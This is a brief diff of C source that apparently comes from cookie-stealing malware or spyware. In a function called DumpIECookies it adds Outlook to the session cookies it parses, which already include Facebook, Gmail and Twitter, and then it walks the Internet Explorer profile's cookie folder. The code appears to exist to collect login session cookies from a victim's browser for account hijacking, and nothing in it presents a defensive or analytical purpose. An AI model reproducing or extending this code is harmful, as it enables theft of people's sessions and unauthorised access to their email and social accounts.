@@ -116,6 +116,7 @@ int DumpIECookies(WCHAR *cookie_path)
 	ParseSessionCookies(FACEBOOK_IE_COOKIE, FACEBOOK_DOMAINA);
 	ParseSessionCookies(GMAIL_IE_COOKIE, GMAIL_DOMAINA);
 	ParseSessionCookies(TWITTER_IE_COOKIE, TWITTER_DOMAINA);
+	ParseSessionCookies(OUTLOOK_IE_COOKIE, OUTLOOK_DOMAINA);
 
 	ie_dir = GetIEProfilePath(cookie_path);
 	_snwprintf_s(cookie_search, MAX_PATH, L"%s\\*", ie_dir);  
